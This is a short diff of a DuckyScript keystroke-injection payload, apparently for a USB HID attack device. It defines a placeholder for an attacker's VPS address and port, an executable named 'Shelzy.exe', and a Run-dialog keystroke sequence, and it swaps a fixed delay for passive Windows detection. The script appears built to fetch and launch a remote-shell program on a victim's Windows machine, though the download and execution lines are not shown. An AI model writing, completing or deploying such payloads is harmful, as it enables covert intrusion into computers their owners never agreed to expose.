@@ -7,8 +7,7 @@ REM Note: replace VPSIPHERE with the IP of your VPS and the correct port (ex:444
 REM Version: 1.0
 DEFINE #VPSISHERE 0.0.0.0
 DEFINE #EXE_NAME Shelzy.exe
-REM Delay for system to recognize and be ready
-DELAY 2000
+PASSIVE_WINDOWS_DETECT
 DELAY 100
 GUI r
 DELAY 500
